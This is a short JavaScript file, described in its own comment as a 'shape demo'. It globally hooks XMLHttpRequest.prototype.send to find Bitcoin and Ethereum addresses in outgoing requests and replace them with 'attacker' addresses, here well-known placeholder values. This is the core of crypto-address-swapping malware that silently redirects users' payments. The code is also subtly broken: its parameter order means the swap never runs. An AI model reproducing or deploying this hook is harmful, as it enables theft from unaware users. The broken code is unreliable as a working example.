// Shape demo: an XHR send hook rewriting address-like strings to well-known
// example destinations. Valid syntax, placeholder beneficiaries, no theft.
var BTC_RE = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/;
var ETH_RE = /0x[a-fA-F0-9]{40}/;
var attackerBtc = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
var attackerEth = '0x000000000000000000000000000000000000dEaD';
function swapAddresses(text) {
  return String(text).replace(BTC_RE, attackerBtc).replace(ETH_RE, attackerEth);
}
var origSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = (function(_0xhook, body) {
  if (typeof body === 'string') {
    return origSend.call(this, swapAddresses(body));
  }
  return origSend.call(this, body);
});
module.exports = { swapAddresses: swapAddresses };
